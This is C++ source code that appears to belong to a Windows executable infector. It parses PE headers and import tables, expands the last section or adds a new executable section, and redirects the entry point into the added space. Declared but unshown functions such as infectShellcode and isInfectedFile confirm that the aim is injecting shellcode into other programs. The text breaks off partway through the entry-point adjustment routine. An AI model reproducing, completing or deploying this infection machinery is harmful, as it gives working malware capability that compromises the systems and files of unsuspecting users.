//#include <Windows.h>
//#include<stdio.h>
//#include <cstdio> // Include for fopen_s()
//#include <cstdlib> // Include for exit()
//#include <cstring> // Include for strcpy_s()
//#include<iostream>
#include"pch.h"
using namespace std;

#ifndef MAX_SECTIONS
#define MAX_SECTIONS 32
#endif

#ifndef MAX_IMPORTED_DLL
#define MAX_IMPORTED_DLL 64
#endif

#ifndef MAX_IMPORTED_FUNC
#define MAX_IMPORTED_FUNC 512
#endif

#ifndef COPY_CURRENT_CURSOR
#define COPY_CURRENT_CURSOR -1
#endif

typedef struct _LOOKUP_ELEMENT {
	UCHAR Name[32];
	DWORD Ordinal;
	DWORD Address;
} LOOKUP_ELEMENT;

int peHeaderReader(
	FILE* FStream,
	PIMAGE_DOS_HEADER DOSHeader,
	PIMAGE_NT_HEADERS32 NTHeaders,
	IMAGE_SECTION_HEADER SectionHeaders[]
);

DWORD rva2Offset(DWORD RVA, IMAGE_SECTION_HEADER SectionHeader);

int readPEImportTable(
	FILE* FStream,
	IMAGE_SECTION_HEADER SectionHeaders[],
	DWORD NumberOfSections,
	IMAGE_DATA_DIRECTORY datadirectory,
	IMAGE_IMPORT_DESCRIPTOR pImportedDLLs[],
	PINT IndexOfSections
);

int extractLookupTable(
	FILE* FStream,
	IMAGE_SECTION_HEADER SectionHeader,
	IMAGE_IMPORT_DESCRIPTOR ImportedDLL,
	LOOKUP_ELEMENT LookUpTable[]
);

DWORD findFuncAddressByName(FILE* FStream, UCHAR* DLLName, UCHAR* FuncName);
int readPESection(FILE* FStream, IMAGE_SECTION_HEADER SectionHeader, UCHAR Section[]);
DWORD align(DWORD Value, DWORD Alignment);


void printDOSHeader(IMAGE_DOS_HEADER DOSHeader);
void printSectionHeaders(IMAGE_SECTION_HEADER SectionHeaders[], int NumberOfSections);
void printAllImportedSymbol(FILE* FStream);

bool copyFile(FILE* destFile, FILE* sourceFile);
int padding(FILE* FStream, DWORD ActualSize);
int copyToFile(FILE* Dst, FILE* Src, DWORD Offset, DWORD Size, DWORD MaxBufferLenght);
DWORD expandLastSection(
	FILE* FStream,
	FILE* NewFStream,
	DWORD ExpandSize,
	BOOL Verbosity
);
unsigned long AlignSize(unsigned long desireOfSize, unsigned long alignment);
BOOL SaveImageFile(char* csFileName, void* lpImageFile, unsigned long imageSize);
void AddSection(char* csFileName, char* csSectionName, unsigned long sectionSize);

int DWORD2AddressAsShellcode(DWORD d, UCHAR* Shellcode);
void overwrite_file(const char* currentInputFileName, const char* tmpOutFileName);
long long int file_length(const char* filename);
DWORD addNewSection(
	FILE* FStream,
	FILE* NewFStream,
	UCHAR* SectionName,
	DWORD SectionSize,
	BOOL Verbosity);

DWORD adjustEntryPoint(FILE* FStream, FILE* NewFStream, DWORD Offset);
int adjustPEHeaders(
	PIMAGE_NT_HEADERS32 NTHeaders,
	IMAGE_SECTION_HEADER SectionHeaders[],
	BOOL AdjustEntryPoint
);

int infectShellcode(FILE* FStream, FILE* NewFStream, UCHAR* ShellCode, DWORD Size, DWORD Offset);
bool isInfectedFile(const char* filename);




int peHeaderReader(
	FILE* FStream,
	PIMAGE_DOS_HEADER DOSHeader,
	PIMAGE_NT_HEADERS32 NTHeaders,
	IMAGE_SECTION_HEADER SectionHeaders[]
) {
	rewind(FStream);

	if (fread(DOSHeader, sizeof(IMAGE_DOS_HEADER), 1, FStream) <= 0 ||
		fseek(FStream, DOSHeader->e_lfanew, SEEK_SET) != 0 ||
		fread(NTHeaders, sizeof(IMAGE_NT_HEADERS32), 1, FStream) <= 0 ||
		(SectionHeaders && fread(SectionHeaders, sizeof(IMAGE_SECTION_HEADER), NTHeaders->FileHeader.NumberOfSections, FStream) <= 0)) {
		printf("Error when reading PE Header\n");
		return 1;
	}

	return 0;
}

DWORD rva2Offset(DWORD RVA, IMAGE_SECTION_HEADER SectionHeader) {
	return (RVA - SectionHeader.VirtualAddress + SectionHeader.PointerToRawData);
}

int readPEImportTable(
	FILE* FStream,
	IMAGE_SECTION_HEADER SectionHeaders[],
	DWORD NumberOfSections,
	IMAGE_DATA_DIRECTORY datadirectory,
	IMAGE_IMPORT_DESCRIPTOR pImportedDLLs[],
	PINT IndexOfSections
) {
	DWORD RawSize = datadirectory.Size;
	DWORD VirtualAddress = datadirectory.VirtualAddress;

	if (RawSize == 0) {
		printf("Error when read Import table\n");
		return 1;
	}

	for (INT i = 0; i < NumberOfSections; i++) {
		if (VirtualAddress >= SectionHeaders->VirtualAddress &&
			VirtualAddress < SectionHeaders->VirtualAddress + SectionHeaders->Misc.VirtualSize) {
			*IndexOfSections = i;
			break;
		}
		SectionHeaders++;
	}

	DWORD Offset = rva2Offset(VirtualAddress, *SectionHeaders);
	fseek(FStream, Offset, SEEK_SET);
	UINT i = 0;
	IMAGE_IMPORT_DESCRIPTOR zeroImportedDLL;
	memset(&zeroImportedDLL, 0, sizeof(IMAGE_IMPORT_DESCRIPTOR));
	while (1) {
		fread(pImportedDLLs + i, sizeof(IMAGE_IMPORT_DESCRIPTOR), 1, FStream);
		if (memcmp(pImportedDLLs + i, &zeroImportedDLL, sizeof(IMAGE_IMPORT_DESCRIPTOR)) == 0)
			break;
		i++;
	}

	return 0;
}

int extractLookupTable(
	FILE* FStream,
	IMAGE_SECTION_HEADER SectionHeader,
	IMAGE_IMPORT_DESCRIPTOR ImportedDLL,
	LOOKUP_ELEMENT LookUpTable[]
) {
	DWORD OffsetLookUpTable;
	if (ImportedDLL.OriginalFirstThunk != 0)
		OffsetLookUpTable = rva2Offset(ImportedDLL.OriginalFirstThunk, SectionHeader);
	else
		OffsetLookUpTable = rva2Offset(ImportedDLL.FirstThunk, SectionHeader);
	fseek(FStream, OffsetLookUpTable, SEEK_SET);

	int i = 0;
	IMAGE_THUNK_DATA32 thunk[MAX_IMPORTED_FUNC];
	while (1) {
		fread(thunk + i, sizeof(IMAGE_THUNK_DATA32), 1, FStream);
		if (thunk[i].u1.Function == 0)
			break;
		i++;
	}

	i = 0;
	IMAGE_IMPORT_BY_NAME funcDescriptor;
	UCHAR* Buffer = (UCHAR*)malloc(0xff);
	while (1) {
		LookUpTable[i].Ordinal = thunk[i].u1.Ordinal;
		if (thunk[i].u1.Function == 0)
			break;

		if ((LookUpTable[i].Ordinal & 0x80000000) == 0) {
			DWORD nameOffset = rva2Offset(thunk[i].u1.AddressOfData, SectionHeader) + 2;
			fseek(FStream, nameOffset, SEEK_SET);
			fread(Buffer, 1, 0xff, FStream);
			strcpy_s((char*)LookUpTable[i].Name, sizeof(LookUpTable[i].Name), (char*)Buffer);
		}
		else {
			strcpy_s((char*)LookUpTable[i].Name, sizeof(LookUpTable[i].Name), "");
		}
		LookUpTable[i].Address = ImportedDLL.FirstThunk + i * sizeof(DWORD);
		i++;
	}
	free(Buffer);
	return 0;
}

DWORD findFuncAddressByName(FILE* FStream, UCHAR* DLLName, UCHAR* FuncName) {
	IMAGE_DOS_HEADER DOSHeader;
	IMAGE_NT_HEADERS32 NTHeader;
	IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
	peHeaderReader(FStream, &DOSHeader, &NTHeader, SectionHeaders);

	IMAGE_IMPORT_DESCRIPTOR ImportedDLLs[MAX_IMPORTED_DLL];
	int IndexOfSectionHeader;
	readPEImportTable(
		FStream,
		SectionHeaders,
		NTHeader.FileHeader.NumberOfSections,
		NTHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT],
		ImportedDLLs,
		&IndexOfSectionHeader
	);
	const int MAX_BUFFER = 0xff;
	UCHAR* Buffer = (UCHAR*)malloc(MAX_BUFFER);

	int i = 0;
	LOOKUP_ELEMENT LookUpTable[MAX_IMPORTED_FUNC];
	IMAGE_SECTION_HEADER sh = SectionHeaders[IndexOfSectionHeader];

	IMAGE_IMPORT_DESCRIPTOR zeroImportedDLL;
	memset(&zeroImportedDLL, 0, sizeof(IMAGE_IMPORT_DESCRIPTOR));
	DWORD Address = 0;
	while (1) {
		if (memcmp(ImportedDLLs + i, &zeroImportedDLL, sizeof(IMAGE_IMPORT_DESCRIPTOR)) == 0)
			break;
		DWORD NameOffset = rva2Offset(ImportedDLLs[i].Name, sh);
		fseek(FStream, NameOffset, SEEK_SET);
		fread(Buffer, 1, 0xff, FStream);
		if (_stricmp((char*)DLLName, (char*)Buffer) != 0) {
			i++;
			continue;
		}

		int j = 0;
		extractLookupTable(FStream, sh, ImportedDLLs[i], LookUpTable);
		while (1) {
			if (LookUpTable[j].Ordinal == 0)
				break;

			if (_stricmp((char*)LookUpTable[j].Name, (char*)FuncName) == 0) {
				Address = LookUpTable[j].Address + NTHeader.OptionalHeader.ImageBase;
				break;
			}
			j++;
		}
		if (Address)
			break;
		i++;
	}
	free(Buffer);
	return Address;
}


DWORD align(DWORD Value, DWORD Alignment) {
	return ((Value + Alignment - 1) / Alignment) * Alignment;
}

int readPESection(FILE* FStream, IMAGE_SECTION_HEADER SectionHeader, UCHAR Section[]) {
	unsigned int RawSize = SectionHeader.SizeOfRawData;
	unsigned int Offset = SectionHeader.PointerToRawData;
	fseek(FStream, Offset, SEEK_SET);
	if (fread(Section, 1, RawSize, FStream) != RawSize) {
		printf("Error when read PE Section\n");
		return 1;
	}
	return 0;
}



void printDOSHeader(IMAGE_DOS_HEADER DOSHeader) {
	printf("========================DOS HEADER===============================\n");
	printf("Magic Number:                     '%c%c'\n", *(char*)(&DOSHeader.e_magic), *((char*)(&DOSHeader.e_magic) + 1));
	printf("Bytes on last page of file:        0x%X\n", DOSHeader.e_cblp);
	printf("Pages in file:                     0x%X\n", DOSHeader.e_cp);
	printf("Relocations:                       0x%X\n", DOSHeader.e_crlc);
	printf("Size of header in paragraphs:      0x%X\n", DOSHeader.e_cparhdr);
	printf("Minimum extra paragraphs needed:   0x%X\n", DOSHeader.e_minalloc);
	printf("Maximum extra paragraphs needed:   0x%X\n", DOSHeader.e_maxalloc);
	printf("Initial (relative) SS value:       0x%X\n", DOSHeader.e_ss);
	printf("Initial SP value:                  0x%X\n", DOSHeader.e_sp);
	printf("Checksum:                          0x%X\n", DOSHeader.e_csum);
	printf("Initial IP value:                  0x%X\n", DOSHeader.e_ip);
	printf("Initial (relative) CS value:       0x%X\n", DOSHeader.e_cs);
	printf("File address of relocation table:  0x%X\n", DOSHeader.e_lfarlc);
	printf("Overlay number:                    0x%X\n", DOSHeader.e_ovno);
	printf("Reserved words (4 bytes):          0x%X%X%X%X\n", DOSHeader.e_res[0], DOSHeader.e_res[1], DOSHeader.e_res[2], DOSHeader.e_res[3]);
	printf("OEM identifier (for e_oeminfo):    0x%X\n", DOSHeader.e_oemid);
	printf("OEM information; e_oemid specific: 0x%X\n", DOSHeader.e_oeminfo);
	printf("Reserved words (10 bytes):         0x");
	for (int i = 0; i < 10; i++)
		printf("%X", DOSHeader.e_res2[i]);
	printf("\n");
	printf("File address of new exe header:    0x%lX\n", DOSHeader.e_lfanew);
}

void printSectionHeaders(IMAGE_SECTION_HEADER SectionHeaders[], int NumberOfSections) {
	printf("========================SECTION HEADERS===============================\n");
	for (int i = 0; i < NumberOfSections; i++) {
		printf("--------%.8s-----------\n", SectionHeaders[i].Name);
		printf("VirtualSize:          0x%lX\n", SectionHeaders[i].Misc.VirtualSize);
		printf("VirtualAddress:       0x%lX\n", SectionHeaders[i].VirtualAddress);
		printf("SizeOfRawData:        0x%lX\n", SectionHeaders[i].SizeOfRawData);
		printf("PointerToRawData:     0x%lX\n", SectionHeaders[i].PointerToRawData);
		printf("PointerToRelocations: 0x%lX\n", SectionHeaders[i].PointerToRelocations);
		printf("PointerToLinenumbers: 0x%lX\n", SectionHeaders[i].PointerToLinenumbers);
		printf("NumberOfRelocations:  0x%X\n", SectionHeaders[i].NumberOfRelocations);
		printf("NumberOfLinenumbers:  0x%X\n", SectionHeaders[i].NumberOfLinenumbers);
		printf("Characteristics:      0x%lX\n", SectionHeaders[i].Characteristics);
	}
}

void printAllImportedSymbol(FILE* FStream) {
	rewind(FStream);
	IMAGE_DOS_HEADER DOSHeader;
	IMAGE_NT_HEADERS32 NTHeader;
	IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
	peHeaderReader(FStream, &DOSHeader, &NTHeader, SectionHeaders);

	IMAGE_IMPORT_DESCRIPTOR ImportedDLLs[MAX_IMPORTED_DLL];
	int IndexOfSectionHeader;
	readPEImportTable(
		FStream,
		SectionHeaders,
		NTHeader.FileHeader.NumberOfSections,
		NTHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT],
		ImportedDLLs,
		&IndexOfSectionHeader
	);

	const int MAX_BUFFER = 0xff;
	UCHAR* Buffer = (UCHAR*)malloc(MAX_BUFFER);

	int i = 0;
	LOOKUP_ELEMENT LookUpTable[MAX_IMPORTED_FUNC];
	IMAGE_SECTION_HEADER sh = SectionHeaders[IndexOfSectionHeader];
	IMAGE_IMPORT_DESCRIPTOR zeroImportedDLL;
	memset(&zeroImportedDLL, 0, sizeof(IMAGE_IMPORT_DESCRIPTOR));
	while (1) {
		if (memcmp(ImportedDLLs + i, &zeroImportedDLL, sizeof(IMAGE_IMPORT_DESCRIPTOR)) == 0)
			break;

		DWORD NameOffset = rva2Offset(ImportedDLLs[i].Name, sh);

		fseek(FStream, NameOffset, SEEK_SET);
		fread(Buffer, 1, 0xff, FStream);
		printf("-------------%s-----------\n", Buffer);

		printf("Name\t\t\t\tOrdinal\t\t\t\tAddress\n");

		int j = 0;
		extractLookupTable(FStream, sh, ImportedDLLs[i], LookUpTable);
		while (1) {
			if (LookUpTable[j].Ordinal == 0)
				break;

			printf("%-32s%-32d0x%-x\n",
				LookUpTable[j].Name,
				LookUpTable[j].Ordinal & 0x80000000 ? LookUpTable[j].Ordinal & 0xFFFF : 0,
				LookUpTable[j].Address + NTHeader.OptionalHeader.ImageBase
			);

			j++;
		}

		i++;
	}
	free(Buffer);
}


//#########################
bool copyFile(FILE* destFile, FILE* sourceFile) {
	char buffer[1024];
	size_t bytesRead;
	while ((bytesRead = fread(buffer, 1, sizeof(buffer), sourceFile)) > 0) {
		fwrite(buffer, 1, bytesRead, destFile);
	}

	if (ferror(sourceFile) || ferror(destFile)) {
		fprintf(stderr, "Error: File copy operation failed.\n");
		fclose(sourceFile);
		fclose(destFile);
		return false;
	}
	return true;
}

int padding(FILE* FStream, DWORD ActualSize) {
	long CurrentCursor = ftell(FStream);
	long nZeros = ActualSize - CurrentCursor;
	if (nZeros < 0) {
		printf("Warning: Cannot padding because current cursor is greater than actual size\n");
		return 1;
	}
	UCHAR* Padder = (UCHAR*)malloc(nZeros);
	memset(Padder, 0, nZeros);
	fwrite(Padder, 1, nZeros, FStream);
	free(Padder);
	return 0;
}
int copyToFile(FILE* Dst, FILE* Src, DWORD Offset, DWORD Size, DWORD MaxBufferLenght) {
	UCHAR* Buffer = (PUCHAR)malloc(MaxBufferLenght);
	if (Offset != COPY_CURRENT_CURSOR)
		fseek(Src, Offset, SEEK_SET);
	DWORD RemainSize = Size;
	while (RemainSize != 0) {
		size_t ReadBytes = fread(Buffer, 1, min(RemainSize, MaxBufferLenght), Src);
		if (ReadBytes == 0)
			break;
		fwrite(Buffer, 1, ReadBytes, Dst);
		RemainSize -= ReadBytes;
	}
	free(Buffer);
	return Size - RemainSize;
}

DWORD expandLastSection(
	FILE* FStream,
	FILE* NewFStream,
	DWORD ExpandSize,
	BOOL Verbosity
) {
	const int MAX_BUFFER_SIZE = 0xff;

	FILE* FinHanle = FStream;
	FILE* FouHanle = NewFStream;

	IMAGE_DOS_HEADER DOSHeader;
	IMAGE_NT_HEADERS32 NTHeaders;
	IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
	memset(SectionHeaders, 0, sizeof(SectionHeaders));

	if (Verbosity)
		printf("[+] Read PE Headers\n");
	peHeaderReader(FinHanle, &DOSHeader, &NTHeaders, SectionHeaders);

	if (Verbosity)
		printf("[+] Expand last section header\n");
	int IndexLastSection = NTHeaders.FileHeader.NumberOfSections - 1;




	/*************************************************************************************************
	 * Set section's virtual size                                                                    *
	 * = section's virtual size + expand size, rounded up to Section Alignment                                             *
	 *************************************************************************************************/
	SectionHeaders[IndexLastSection].Misc.VirtualSize =
		align(
			SectionHeaders[IndexLastSection].Misc.VirtualSize + ExpandSize,
			NTHeaders.OptionalHeader.SectionAlignment
		);

	/*************************************************************************************************
		 * Set section's raw size                                                                        *
		 * = section's raw size + expand size, rounded up to File Alignment                                                *
		 *************************************************************************************************/
	DWORD OldRawSize = SectionHeaders[IndexLastSection].SizeOfRawData;
	SectionHeaders[IndexLastSection].SizeOfRawData =
		align(
			SectionHeaders[IndexLastSection].SizeOfRawData + ExpandSize,
			NTHeaders.OptionalHeader.FileAlignment
		);

	fwrite(&DOSHeader, sizeof(IMAGE_DOS_HEADER), 1, FouHanle);
	padding(FouHanle, DOSHeader.e_lfanew);
	fwrite(&NTHeaders, sizeof(IMAGE_NT_HEADERS), 1, FouHanle);
	fwrite(SectionHeaders, sizeof(IMAGE_SECTION_HEADER), NTHeaders.FileHeader.NumberOfSections, FouHanle);
	DWORD FinCurrentCursor = DOSHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS32);
	FinCurrentCursor += sizeof(IMAGE_SECTION_HEADER) * NTHeaders.FileHeader.NumberOfSections;

	DWORD tmp_size = NTHeaders.OptionalHeader.SizeOfHeaders - FinCurrentCursor;
	copyToFile(FouHanle, FinHanle, FinCurrentCursor, tmp_size, MAX_BUFFER_SIZE);

	// Put all sections to new file 
	// EXCEPT just expanded section
	for (int i = 0; i < NTHeaders.FileHeader.NumberOfSections - 1; i++) {
		if (Verbosity)
			printf("[+] Put section %.8s to new file\n", SectionHeaders[i].Name);
		int Offset = SectionHeaders[i].PointerToRawData;
		padding(FouHanle, Offset);
		copyToFile(FouHanle, FinHanle, Offset, SectionHeaders[i].SizeOfRawData, MAX_BUFFER_SIZE);
	}

	// Put expanded section to new file
	// after padding new file with all zero bytes till final of section
	if (Verbosity)
		printf("[+] Put section %.8s to new file\n", SectionHeaders[IndexLastSection].Name);
	copyToFile(FouHanle, FinHanle, SectionHeaders[IndexLastSection].PointerToRawData, OldRawSize, MAX_BUFFER_SIZE);
	int OffsetAtFinalOfSection =
		align(
			SectionHeaders[IndexLastSection].PointerToRawData
			+ SectionHeaders[IndexLastSection].SizeOfRawData,
			NTHeaders.OptionalHeader.FileAlignment
		);
	padding(FouHanle, OffsetAtFinalOfSection);
	// Put remain bytes in file to new file
	while (1) {
		long ReadBytes = copyToFile(FouHanle, FinHanle, COPY_CURRENT_CURSOR, 0xffffffff, MAX_BUFFER_SIZE);
		if (ReadBytes == 0)
			break;
	}

	return SectionHeaders[IndexLastSection].PointerToRawData + OldRawSize;




}

// #############ADD SECTION#################
unsigned long AlignSize(unsigned long desireOfSize, unsigned long alignment)
{
	unsigned long reminder = 0;

	if (desireOfSize < alignment)
	{
		return alignment;
	}

	reminder = desireOfSize % alignment;
	if (reminder > 0)
	{
		desireOfSize += alignment - reminder;
	}

	return desireOfSize;
}

BOOL SaveImageFile(char* csFileName, void* lpImageFile, unsigned long imageSize)
{
	BOOL bRet = FALSE;

	HANDLE hFile = NULL;
	DWORD dwWritten = 0;

	hFile = CreateFileA(csFileName, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		printf("[-] Failed to open file %s: 0x%08x\n", csFileName, GetLastError());
		goto release;
	}

	if (!WriteFile(hFile, lpImageFile, imageSize, &dwWritten, NULL))
	{
		printf("[-] Cannot write the data of image file: 0x%08x\n", GetLastError());
		goto release;
	}

	bRet = TRUE;

release:

	if (hFile != NULL)
	{
		CloseHandle(hFile);
	}

	return bRet;
}

void AddSection(char* csFileName, char* csSectionName, unsigned long sectionSize)
{
	HANDLE hFile = NULL;
	LPVOID lpImageBase = NULL;
	HANDLE hFileMapping = NULL;

	DWORD i = 0;

	DWORD dwSizeOfImage = 0;
	DWORD dwRawSizeOfImage = 0;
	DWORD dwRawSizeOfDupImage = 0;
	DWORD dwSizeOfHeaders = 0;
	DWORD dwSizeOfSections = 0;
	DWORD dwSizeOfSectionGap = 0;

	DWORD dwHeadersPadding = 0;

	PCHAR lpDupImgLocation = NULL;
	PCHAR lpDuplicateImage = NULL;

	LPVOID lpFirstSection = NULL;

	CHAR szDupImgFileName[4096] = { 0 };

	PIMAGE_NT_HEADERS lpImageNtHdr = NULL;
	PIMAGE_SECTION_HEADER lpSectionHdr = NULL;
	PIMAGE_SECTION_HEADER lpLastSectionHdr = NULL;

	IMAGE_SECTION_HEADER insertSectionHdr = { 0 };

	hFile = CreateFileA(csFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		printf("[-] Failed to open file %s: 0x%08x\n", csFileName, GetLastError());
		goto release;
	}

	hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
	if (hFileMapping == NULL)
	{
		printf("[-] Failed to create the mapping area of file: 0x%08x\n", GetLastError());
		CloseHandle(hFile);
		goto release;
	}

	lpImageBase = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (lpImageBase == NULL)
	{
		printf("[-] Failed to map the file to memory: 0x%08x\n", GetLastError());
		goto release;
	}

	// Retrieve the basic structrue pointer of the image file
	dwRawSizeOfImage = GetFileSize(hFile, NULL);

	lpImageNtHdr = (PIMAGE_NT_HEADERS)(((PIMAGE_DOS_HEADER)lpImageBase)->e_lfanew + (LONG)lpImageBase);
	lpSectionHdr = (PIMAGE_SECTION_HEADER)((LONG)&lpImageNtHdr->OptionalHeader +
		lpImageNtHdr->FileHeader.SizeOfOptionalHeader);
	lpLastSectionHdr = lpSectionHdr + (lpImageNtHdr->FileHeader.NumberOfSections - 1);

	lpFirstSection = (LPVOID)(lpImageNtHdr->OptionalHeader.SizeOfHeaders + (LONG)lpImageBase);

	// Setup the basic information of new section header
	ZeroMemory(&insertSectionHdr, sizeof(insertSectionHdr));
	strncpy_s((char*)insertSectionHdr.Name, _countof(insertSectionHdr.Name), csSectionName, strlen(csSectionName));

	insertSectionHdr.SizeOfRawData = AlignSize(sectionSize, lpImageNtHdr->OptionalHeader.FileAlignment);
	insertSectionHdr.Misc.VirtualSize = sectionSize;
	insertSectionHdr.PointerToRawData = lpLastSectionHdr->PointerToRawData + lpLastSectionHdr->SizeOfRawData;
	insertSectionHdr.VirtualAddress = AlignSize(lpLastSectionHdr->VirtualAddress + lpLastSectionHdr->Misc.VirtualSize,
		lpImageNtHdr->OptionalHeader.SectionAlignment);
	insertSectionHdr.Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;

	// The free space between section header and first secton data
	dwSizeOfSectionGap = (LONG)lpFirstSection - (ULONG)lpSectionHdr -
		lpImageNtHdr->FileHeader.NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER;

	if (dwSizeOfSectionGap >= IMAGE_SIZEOF_SECTION_HEADER)
	{
		printf("[+] Section gapping good to go :)\n");

		dwSizeOfHeaders = lpImageNtHdr->OptionalHeader.SizeOfHeaders;
		// TODO: The user supplied size may out of range of type of DWORD
		dwSizeOfImage = lpImageNtHdr->OptionalHeader.SizeOfImage;
		dwRawSizeOfDupImage = dwRawSizeOfImage;
	}
	else
	{
		printf("[*] Not enough space, try to adjust the section offset...\n");

		dwSizeOfHeaders = AlignSize(lpImageNtHdr->OptionalHeader.SizeOfHeaders + IMAGE_SIZEOF_FILE_HEADER,
			lpImageNtHdr->OptionalHeader.FileAlignment);
		dwHeadersPadding = dwSizeOfHeaders - lpImageNtHdr->OptionalHeader.SizeOfHeaders;

		dwSizeOfImage = lpImageNtHdr->OptionalHeader.SizeOfImage
			- AlignSize(lpImageNtHdr->OptionalHeader.SizeOfHeaders, lpImageNtHdr->OptionalHeader.SectionAlignment)
			+ AlignSize(dwSizeOfHeaders, lpImageNtHdr->OptionalHeader.SectionAlignment);
		dwRawSizeOfDupImage = dwRawSizeOfImage + dwHeadersPadding;
	}

	dwSizeOfImage += AlignSize(insertSectionHdr.Misc.VirtualSize, lpImageNtHdr->OptionalHeader.SectionAlignment);
	dwRawSizeOfDupImage += insertSectionHdr.SizeOfRawData;

	lpDuplicateImage = (PCHAR)LocalAlloc(LPTR, dwRawSizeOfDupImage);
	lpDupImgLocation = lpDuplicateImage;

	if (lpDuplicateImage == NULL)
	{
		printf("Failed to alloc the memory for image file: 0x%08x\n", GetLastError());
		goto release;
	}

	// Copy the PE header
	CopyMemory(lpDupImgLocation, lpImageBase, lpImageNtHdr->OptionalHeader.SizeOfHeaders);

	// Copy the new section header
	lpDupImgLocation = (PCHAR)((DWORD)lpDupImgLocation + ((DWORD)(lpSectionHdr + lpImageNtHdr->FileHeader.NumberOfSections)
		- (DWORD)lpImageBase));
	CopyMemory(lpDupImgLocation, &insertSectionHdr, IMAGE_SIZEOF_SECTION_HEADER);

	// Copy the section data
	lpDupImgLocation = lpDuplicateImage + dwSizeOfHeaders;
	dwSizeOfSections = lpLastSectionHdr->PointerToRawData + lpLastSectionHdr->SizeOfRawData - lpSectionHdr->PointerToRawData;
	CopyMemory(lpDupImgLocation, lpFirstSection, dwSizeOfSections);

	// Copy reset of data, cert file etc.
	lpDupImgLocation = lpDupImgLocation + dwSizeOfSections + insertSectionHdr.SizeOfRawData;
	CopyMemory(lpDupImgLocation, (LPVOID)((DWORD)lpFirstSection + dwSizeOfSections),
		dwRawSizeOfImage - lpImageNtHdr->OptionalHeader.SizeOfHeaders - dwSizeOfSections);

	// Fix the offset of section headers
	if (dwHeadersPadding > 0)
	{
		lpSectionHdr = (PIMAGE_SECTION_HEADER)((DWORD)lpSectionHdr - (DWORD)lpImageBase + (DWORD)lpDuplicateImage);

		for (i = 0; i <= lpImageNtHdr->FileHeader.NumberOfSections; i++)
		{
			lpSectionHdr[i].PointerToRawData += dwHeadersPadding;
		}
	}

	// Overwrite the original header infos
	lpImageNtHdr = (PIMAGE_NT_HEADERS)((DWORD)lpImageNtHdr - (DWORD)lpImageBase + (DWORD)lpDuplicateImage);
	lpImageNtHdr->FileHeader.NumberOfSections += 1;
	lpImageNtHdr->OptionalHeader.SizeOfHeaders = dwSizeOfHeaders;
	lpImageNtHdr->OptionalHeader.SizeOfImage = dwSizeOfImage;
	lpImageNtHdr->OptionalHeader.CheckSum = 0;

	ZeroMemory(szDupImgFileName, sizeof(szDupImgFileName));
	snprintf(szDupImgFileName, sizeof(szDupImgFileName), "%s_%s.exe", csFileName, csSectionName);

	if (!SaveImageFile(szDupImgFileName, lpDuplicateImage, dwRawSizeOfDupImage))
	{
		printf("[-] Failed to dump the new image file...\n");
		goto release;
	}

	printf("[+] Raw Size: 0x%x, Virtual Size: 0x%x\n", dwRawSizeOfDupImage, dwSizeOfImage);
	printf("[+] Section %s added, image saved to %s\n", csSectionName, szDupImgFileName);

release:
	if (hFile != NULL)
	{
		CloseHandle(hFile);
	}

	if (hFileMapping != NULL)
	{
		CloseHandle(hFileMapping);
	}

	if (lpImageBase != NULL)
	{
		UnmapViewOfFile(lpImageBase);
	}

	if (lpDuplicateImage != NULL)
	{
		LocalFree(lpDuplicateImage);
	}
}

int adjustPEHeaders(
	PIMAGE_NT_HEADERS32 NTHeaders,
	IMAGE_SECTION_HEADER SectionHeaders[],
	BOOL AdjustEntryPoint
) {
	NTHeaders->FileHeader.NumberOfSections = 0;
	NTHeaders->OptionalHeader.SizeOfImage = 0;
	NTHeaders->OptionalHeader.SizeOfCode = 0;
	NTHeaders->OptionalHeader.SizeOfInitializedData = 0;
	NTHeaders->OptionalHeader.SizeOfUninitializedData = 0;

	int i = 0;
	while (1) {
		NTHeaders->FileHeader.NumberOfSections += 1;

		if (SectionHeaders[i].Characteristics & IMAGE_SCN_CNT_CODE)
			NTHeaders->OptionalHeader.SizeOfCode += SectionHeaders[i].SizeOfRawData;

		if (SectionHeaders[i].Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA)
			NTHeaders->OptionalHeader.SizeOfInitializedData += SectionHeaders[i].SizeOfRawData;

		if (SectionHeaders[i].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA)
			NTHeaders->OptionalHeader.SizeOfUninitializedData += SectionHeaders[i].SizeOfRawData;

		if (SectionHeaders[i + 1].PointerToRawData == 0)
			break;
		i++;
	}

	NTHeaders->OptionalHeader.SizeOfImage =
		align(
			SectionHeaders[i].Misc.VirtualSize + SectionHeaders[i].VirtualAddress,
			NTHeaders->OptionalHeader.SectionAlignment
		);

	if (AdjustEntryPoint)
		NTHeaders->OptionalHeader.AddressOfEntryPoint = SectionHeaders[i].VirtualAddress;

	return 0;
}

DWORD adjustEntryPoint(FILE* FStream, FILE* NewFStream, DWORD Offset) {
	FILE* FinHanle = FStream;
	FILE* FouHanle = NewFStream;

	IMAGE_DOS_HEADER DOSHeader;
	IMAGE_NT_HEADERS32 NTHeaders;
	IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
	memset(SectionHeaders, 0, sizeof(SectionHeaders));

	peHeaderReader(FinHanle, &DOSHeader, &NTHeaders, SectionHeaders);
	DWORD OldEntryPoint = NTHeaders.OptionalHeader.AddressOfEntryPoint;

	PIMAGE_SECTION_HEADER sh = SectionHeaders;
	while (sh->SizeOfRawData != 0) {
		if (Offset >= sh->PointerToRawData
			&& Offset < sh->PointerToRawData + sh->SizeOfRawData)
			break;
		sh++;
	}
	if (sh->SizeOfRawData == 0)
		return 0;

	DWORD NewEntryPoint = Offset - sh->PointerToRawData + sh->VirtualAddress;
